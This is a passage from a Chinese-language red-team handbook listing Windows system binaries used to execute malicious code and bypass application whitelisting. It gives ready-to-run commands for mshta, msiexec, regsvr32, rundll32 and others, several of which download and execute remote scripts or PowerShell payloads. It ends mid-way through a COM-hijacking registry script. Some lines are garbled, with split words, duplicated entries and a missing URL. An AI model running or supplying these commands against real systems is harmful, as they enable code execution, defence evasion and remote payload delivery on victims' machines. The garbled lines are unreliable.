用例：使用Msconfig.exe 执行代码 所需权限：管理员 操作系统：Windows
vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Msdt.exe
####### 文件路径
> C:\\Windows\\System32\\Msdt.exeC:\\Windows\\SysWOW64\\Msdt.exe
####### 执行恶意代码
执行Microsoft 诊断工具并执行PCW8E57.xml 文件中引用的恶意.MSI。
> msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af
> C:\\PCW8 E57.xml /skip TRUE
用例：执行代码绕过应用程序白名单 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Mshta.exe
> **文件路径**C:\\Windows\\System32\\mshta.exe
> C:\\Windows\\SysWOW64\\mshta.exe
####### 执行
打开目标.HTA 并执行嵌入式JavaScript，JScript 或VBScript。
> mshta.exe evilfile.hta
执行作为命令行参数提供的VBScript。
> mshta.exe
> vbscript:Close(Execute(\"GetObject(\"\"script:https\[:\]//webserver/payload\[.\]
> sct\"\")\"))
执行作为命令行参数提供的JavaScript。
> mshta.exe
> javascript:a=GetObject(\"script:https://raw.githubusercontent.com/LOLB
> AS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct\").Exec();close();
用例：执行代码 所需权限：User 操作系统：Windows Vista，Windows 7，
Windows 8，Windows 8.1，Windows 10 Mitre：T1170 ）
## Msiexec.exe
由Windows 用于执行msi 文件的二进制程序
> **文件路径**C:\\Windows\\System32\\msiexec.exe
> C:\\Windows\\SysWOW64\\msiexec.exe
####### 执行恶意代码
以静默方式安装目标.MSI 文件。
> msiexec /quiet /i cmd.msi
以静默方式 安装目标远程和重命名的.MSI 文件。
> msiexec /q /i 
用例：使用来自远程服务器的攻击代码执行自定义msi
文件调用DLLRegisterServer 注册目标DLL。
> msiexec /y \"C:\\folder\\evil.dll\"
调用DLLRegisterServer 取消注册目标DLL。
> msiexec /z \"C:\\folder\\evil.dll\"
用例：执行dll 文件 所需权限：User 操作系统：Windows Vista，Windows 7，
Windows 8，Windows 8.1，Windows 10
## Odbcconf.exe
在Windows 中用于管理ODBC 连接的二进制程序
> **文件路径**C:\\Windows\\System32\\odbcconf.exe
> C:\\Windows\\SysWOW64\\odbcconf.exe
####### 执行恶意代码
加载目标.RSP 文件中指定的DLL。有关示例.RSP 文件，请参阅Playloads
文件夹。
> odbcconf -f file.rsp
https://gist.githubusercontent.com/NickTyrer/6ef02ce3fd623483137b45f65
017352b/raw/fdffd313397ef13da61e329a9e8709f7d2458ebc/odbcconf.cs
用例：使用可以规避防御性对策的技术执行dll 文件 所需权限：User 操作系统：
Windows Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Pcalua.exe
程序兼容性助手程序
####### 文件路径
> C:\\Windows\\System32\\pcalua.exe
####### 执行恶意代码
使用程序兼容性助手打开目标.EXE。
> pcalua.exe -a calc.exe
使用Program Compatibilty Assistant 打开目标.DLL 文件。
> pcalua.exe -a \\\\server\\payload.dll
用例：执行恶意代码 所需权限：User 操作系统：Windows vista，Windows 7，
Windows 8，Windows 8.1，Windows 10
## Presentationhost.exe
文件用于执行浏览器应用程序
> **文件路径**C:\\Windows\\System32\\Presentationhost.exe
> C:\\Windows\\SysWOW64\\Presentationhost.exe
####### 执行恶意代码
执行目标XAML 浏览器应用程序（XBAP）文件
> Presentationhost.exe C:\\temp\\Evil.xbap
用例：在xbap 文件中执行代码 所需权限：User 操作系统：Windows vista，
Windows 7，Windows 8，Windows 8.1，Windows 10
## Regasm.exe
> **路径**C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe
####### 应用程序白名单绕过
加载目标.DLL 文件并执行RegisterClass 函数。
> regasm.exe AllTheThingsx64.dll
执行加载目标.DLL 文件并执行RegisterClass 函数。
> regasm.exe AllTheThingsx64.dll
用例：执行代码并绕过应用程序白名单 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Register-cimprovider.exe
####### 文件路径
> C:\\Windows\\System32\\Register-cimprovider.exe
>
> C:\\Windows\\SysWOW64\\Register-cimprovider.exe
####### 执行恶意代码
加载目标.DLL。
> Register-cimprovider -path \"C:\\folder\\evil.dll\"
用例：执行dll 文件中的代码 所需权限：User 操作系统：Windows Vista，
Windows 7，Windows 8，Windows 8.1，Windows 10
## Regsvcs.exe
Regsvcs 和Regasm 是Windows 命令行实用程序，用于注册.NET 组件对象模型
（COM）程序集
####### 文件路径
> C:\\Windows\\System32\\regsvcs.exe
>
> C:\\Windows\\SysWOW64\\regsvcs.exe
####### 执行恶意代码
加载目标.DLL 文件并执行RegisterClass 函数。
> regsvcs.exe AllTheThingsx64.dll
用例：执行dll 文件并绕过应用程序白名单 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10 Mitre：T1121
应用程序白名单绕过加载目标.DLL 文件并执行RegisterClass 函数。
> regsvcs.exe AllTheThingsx64.dll
用例：执行dll 文件并绕过应用程序白名单 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Regsvr32.exe
由Windows 用于注册dll
> **文件路径**C:\\Windows\\System32\\regsvr32.exe
> C:\\Windows\\SysWOW64\\regsvr32.exe
####### 应用程序白名单绕过 {#应用程序白名单绕过}
使用scrobj.dll 执行指定的远程.SCT 脚本。
> regsvr32 /s /n /u /i: scrobj.dll
> 使用scrobj.dll 执行指定的本地.SCT 脚本。regsvr32.exe /s /u /i:file.sct
> scrobj.dll
####### 执行恶意代码
使用scrobj.dll 执行指定的远程.SCT 脚本。
> regsvr32 /s /n /u /i: scrobj.dll
> 使用scrobj.dll 执行指定的本地.SCT 脚本。regsvr32.exe /s /u /i:file.sct
> scrobj.dll
用例：从scriptlet 执行代码，绕过应用程序白名单 所需权限：User 操作系统：
Windows Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Rundll32.exe
由Windows 用于执行dll 文件
####### 文件路径
> C:\\Windows\\System32\\rundll32.exeC:\\Windows\\SysWOW64\\rundll32.exe
####### 执行恶意代码 {#执行恶意代码}
AllTheThingsx64 将是.DLL 文件，EntryPoint 将是要执行的.DLL
文件中的入口点的名称。
> rundll32.exe AllTheThingsx64,EntryPoint
使用Rundll32.exe 执行运行从远程网站下载的PowerShell 脚本的JavaScript
脚本。
> rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication
> \";document.write();new%20
> ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c
> IEX (New-O bject Net.WebClient).DownloadString(\'http://ip:port/\');\"
使用Rundll32.exe 执行运行calc.exe 的JavaScript 脚本。
> rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication
> \";eval(\"w=new%20Active
> XObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");
使用Rundll32.exe 执行运行calc.exe 的JavaScript
脚本，然后终止Rundll32.exe 进程开始了。
> rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication
> \";document.write();h=new%
> 20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseTe
> xt;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd
> /c taskkill /f /i m rundll32.exe\",0,true);}
使用Rundll32.exe 执行调用远程JavaScript 脚本的JavaScript 脚本。
> rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication
> \";document.write();GetObje
> ct(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/mast
> er/test\")
使用Rundll32.exe 加载已注册或被劫持的COM Server
有效负载。也适用于ProgID。
> rundll32.exe -sta {CLSID}
执行ADS 中的.DLL 文件。
> rundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain
用例：执行备用数据流中的代码 所需权限：User 操作系统：Windows Vista，
Windows 7，Windows 8，Windows 8.1，Windows 10
37. ## COM 劫持
    1.  ![](media/image227.jpeg){width="5.746181102362205in"
        height="2.060416666666667in"}**COM 劫持(T1122)Component Object
        Model Hijacking(例 1)**
![](media/image228.jpeg){width="5.879604111986001in"
height="3.0708333333333333in"}
![](media/image229.jpeg){width="5.81889435695538in"
height="0.6716666666666666in"}![](media/image230.jpeg){width="5.366352799650044in"
height="1.030207786526684in"}
> \"C:\\Program Files\\Internet Explorer\\iexplore.exe\"
> shell:::{55555555-5555-5555-55 55-555555555555}
>
> C:\\Windows\\explorer.exe
> shell:::{55555555-5555-5555-5555-555555555555}
>
> \$CLSID = \"55555555-5555-5555-5555-555555555555\"
>
> Remove-Item -Recurse -Force -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\"
>
> -ErrorAction SilentlyContinue
>
> \$payload = \"C:\\Users\\demon\\Desktop\\mbox.dll\"
>
> New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\" -ErrorAction